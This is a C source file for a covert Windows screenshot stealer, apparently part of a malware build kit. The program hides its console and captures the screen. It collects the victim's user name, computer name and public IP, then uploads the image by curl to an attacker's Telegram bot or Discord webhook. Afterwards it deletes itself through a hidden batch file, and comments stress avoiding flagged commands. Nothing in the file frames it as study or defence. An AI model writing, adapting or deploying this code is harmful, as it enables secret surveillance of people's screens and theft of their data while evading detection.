/*
 * screen_grab.c — Captures screenshot of primary monitor via GDI
 * Sends the image to Telegram/Discord
 *
 * HOW IT WORKS:
 * 1. Gets primary monitor dimensions via GetSystemMetrics
 * 2. Captures screen using GDI (CreateCompatibleDC, BitBlt)
 * 3. Saves as BMP temp file
 * 4. Sends to Telegram (sendPhoto) or Discord (webhook file upload)
 * 5. Cleans up temp file and self-deletes
 *
 * Uses native Windows APIs:
 * - gdi32.lib for screen capture (BitBlt, CreateCompatibleDC)
 * - user32.lib for GetSystemMetrics, GetDesktopWindow
 * - No PowerShell, no flagged commands
 *
 * Compile: python build.py screen --telegram --token X --chat Y
 *
 * Manual compile (MSVC):
 *   cl screen_grab.c /Fe:screen_grab.exe /DUSE_TELEGRAM /DTG_TOKEN="token" /DTG_CHAT="chat_id"
 *   cl screen_grab.c /Fe:screen_grab.exe /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
 *
 * Manual compile (GCC):
 *   gcc screen_grab.c -o screen_grab.exe -lgdi32 -luser32 -ladvapi32
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// ══════════════════════════════════════════════════
// EXFIL CONFIG — Set via compiler flags:
//   /DUSE_TELEGRAM /DTG_TOKEN="token" /DTG_CHAT="chat_id"
//   /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
// ══════════════════════════════════════════════════

#if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
#define USE_TELEGRAM
#endif

#ifndef TG_TOKEN
#define TG_TOKEN "YOUR_BOT_TOKEN"
#endif

#ifndef TG_CHAT
#define TG_CHAT "YOUR_CHAT_ID_HERE"
#endif

#ifndef DC_WEBHOOK
#define DC_WEBHOOK "YOUR_WEBHOOK_URL"
#endif

// ══════════════════════════════════════════════════
// Machine info (cached)
// ══════════════════════════════════════════════════

static char g_caption[512] = {0};

void init_info() {
    if (g_caption[0] != 0) return;
    char compName[256], userName[256], pubIP[64] = {0};
    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
    GetComputerNameA(compName, &s1);
    GetUserNameA(userName, &s2);

    // Public IP
    system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char ipf[MAX_PATH];
    snprintf(ipf, MAX_PATH, "%sip.txt", tmp);
    FILE *f = fopen(ipf, "r");
    if (f) { fgets(pubIP, sizeof(pubIP), f); fclose(f); DeleteFileA(ipf); }
    char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
    nl = strchr(pubIP, '\r'); if (nl) *nl = 0;

    // Screen resolution
    int cx = GetSystemMetrics(SM_CXSCREEN);
    int cy = GetSystemMetrics(SM_CYSCREEN);

    snprintf(g_caption, sizeof(g_caption),
        "ScreenGrab_%s@%s [%s] %dx%d", userName, compName, pubIP, cx, cy);
}

// ══════════════════════════════════════════════════
// Screenshot capture via GDI
// ══════════════════════════════════════════════════

int capture_screen(const char *outpath) {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    if (width <= 0 || height <= 0) return 0;

    // Get screen DC
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return 0;

    // Create compatible DC and bitmap
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hBitmap) {
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }

    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);

    // BitBlt the screen into our bitmap
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    SelectObject(hdcMem, hOld);

    // Prepare BITMAPINFOHEADER
    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;  // Top-down DIB
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    // Calculate row stride (must be DWORD-aligned)
    int stride = ((width * 3 + 3) & ~3);
    int imageSize = stride * height;

    // Allocate pixel buffer
    BYTE *pixels = (BYTE *)malloc(imageSize);
    if (!pixels) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }

    // Get the bitmap bits
    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader = bi;
    GetDIBits(hdcMem, hBitmap, 0, height, pixels, &bmi, DIB_RGB_COLORS);

    // Write BMP file
    BITMAPFILEHEADER bfh;
    ZeroMemory(&bfh, sizeof(bfh));
    bfh.bfType = 0x4D42;  // "BM"
    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    FILE *fp = fopen(outpath, "wb");
    if (!fp) {
        free(pixels);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }

    fwrite(&bfh, sizeof(bfh), 1, fp);
    fwrite(&bi, sizeof(bi), 1, fp);
    fwrite(pixels, imageSize, 1, fp);
    fclose(fp);

    // Cleanup GDI
    free(pixels);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return 1;
}

// ══════════════════════════════════════════════════
// Send screenshot to Telegram/Discord
// ══════════════════════════════════════════════════

void send_photo(const char *filepath) {
    init_info();
    char cmd[2048];

#ifdef USE_TELEGRAM
    // Telegram sendDocument (BMP too large for sendPhoto limit)
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"chat_id=" TG_CHAT "\" "
        "-F \"document=@%s\" "
        "-F \"caption=%s\" "
        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
        filepath, g_caption);
#endif

#ifdef USE_DISCORD
    // Discord webhook file upload
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"file=@%s\" "
        "-F \"payload_json={\\\"content\\\":\\\"%s\\\"}\" "
        "\"" DC_WEBHOOK "\" >nul 2>nul",
        filepath, g_caption);
#endif

    system(cmd);
}

// ══════════════════════════════════════════════════
// Self-delete via batch file trick
// ══════════════════════════════════════════════════

void self_delete() {
    char exePath[MAX_PATH], batPath[MAX_PATH], tmp[MAX_PATH];

    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    GetTempPathA(MAX_PATH, tmp);
    snprintf(batPath, MAX_PATH, "%ssg_del.bat", tmp);

    FILE *bat = fopen(batPath, "w");
    if (!bat) return;

    fprintf(bat,
        "@echo off\n"
        ":retry\n"
        "del /f \"%s\" >nul 2>nul\n"
        "if exist \"%s\" (ping -n 1 127.0.0.1 >nul & goto retry)\n"
        "del /f \"%%~f0\" >nul 2>nul\n",
        exePath, exePath);
    fclose(bat);

    // Launch the batch file hidden
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    char batCmd[MAX_PATH + 16];
    snprintf(batCmd, sizeof(batCmd), "cmd.exe /c \"%s\"", batPath);
    CreateProcessA(NULL, batCmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// ══════════════════════════════════════════════════
// Main
// ══════════════════════════════════════════════════

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char outFile[MAX_PATH];
    snprintf(outFile, MAX_PATH, "%ssg.bmp", tempPath);

    // Capture screenshot
    if (capture_screen(outFile)) {
        // Send to Telegram/Discord
        send_photo(outFile);
    }

    // Clean up temp file
    DeleteFileA(outFile);

    // Self-delete the executable
    self_delete();

    return 0;
}
